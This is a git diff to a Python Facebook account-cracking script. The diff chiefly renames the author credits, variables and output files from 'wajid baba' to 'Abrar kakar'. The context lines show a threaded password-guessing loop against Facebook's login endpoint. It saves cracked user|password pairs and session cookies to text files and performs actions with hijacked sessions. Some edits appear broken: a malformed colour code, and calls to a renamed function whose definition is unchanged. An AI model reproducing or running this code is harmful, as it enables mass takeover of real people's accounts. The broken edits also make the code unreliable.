@@ -19,7 +19,7 @@ except ImportError:
     os.system('pip install bs4')
 
 import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
-from concurrent.futures import ThreadPoolExecutor as wajidbaba
+from concurrent.futures import ThreadPoolExecutor as Abrarkakar
 from datetime import datetime
 from bs4 import BeautifulSoup
 
@@ -81,9 +81,9 @@ logo =                                          """
 \033[1;37m| $$$$$$$/| $$  | $$| $$$$$$$/
 \033[1;37m|_______/ |__/  |__/|_______/	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
 \x1b[1;97m------------------------\x1b[1;97m------------------------
-\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37mwajid baba
-\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37mwajid baba
-\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37mSy3d-wajid
+\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37Abrar kakar
+\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37Abrar kakar
+\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37mS-Kakar
 \033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m1.1
 \033[1;37m------------------------\033[1;37m------------------------ """                                              
 
@@ -93,7 +93,7 @@ def hasil(OK,cp):
 	if len(cp) != 0:
 	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mbaba_OK.txt' % (H, P, str(len(ok))))
 	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mbaba_CP.txt' % (H, P, str(len(cp))))
-	    input("\x1b[1;97mPress enter to back WAJID Menu ")
+	    input("\x1b[1;97mPress enter to back Kakar Menu ")
 	    wajid()
 
 def wajid():
@@ -132,10 +132,10 @@ class __xxx__:
             self.__pler__()
         else:
             print(' [!] Choose Correct One');
-            self.wajidx(id)
+            self.kakarx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f"\r \x1b[1;97m[WAJID] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
+        sys.stdout.write(f"\r \x1b[1;97m[ABRAR] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -185,10 +185,10 @@ class __xxx__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f"\r{H} [WAJID-OK] {user} | {pw}")
+                    print(f"\r{H} [Kakar-OK] {user} | {pw}")
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('WAJID_OK.txt' , 'a').write('%s\n' % wrt)
+                    open('Kakar_OK.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -200,7 +200,7 @@ class __xxx__:
                         print('\r%s [WAJID-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('WAJID_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('Kakar_CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -208,10 +208,10 @@ class __xxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [WAJID-CP] %s | %s ' % (M, user, pw))
+                    print('\r%s [Kakar-CP] %s | %s ' % (M, user, pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('WAJID_CP.txt' , 'a').write('%s\n' % wrt)
+                    open('Kakar_CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
@@ -239,7 +239,7 @@ class __xxx__:
             print('\033[1;37m Total Auto file IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with wajidbaba(max_workers=30) as babaworld:
+            with Abrarkakar(max_workers=30) as Kakarworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -273,7 +273,7 @@ class __xxx__:
             print('\033[1;37m Total IDs : %s ' % len(self.id))
             print('\033[1;37m Cracking Started...')
             print(47*"-")
-            with wajidbaba(max_workers=30) as babaworld:
+            with Abrarkakar(max_workers=30) as Kakarworld:
                 for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
                         uid, name = zsb.split('|')
@@ -342,7 +342,7 @@ def manual():
                 try:
                     last_name = names.split(' ')[1]
                 except:
-                    last_name = 'baba'
+                    last_name = 'Kakar'
                 with open('/sdcard/'+save_file, 'a') as rd:
                     rd.write(uids+'|'+first_name+'|'+last_name+'\n')
         except KeyError:
@@ -463,8 +463,8 @@ def auto():
     print('  File saved as: /sdcard/'+save_file)
     print(50*'-')
     input('  Press enter to back ')
-    wajid()
+    Kakar()
     
     
     
-wajid()
+Kakar()
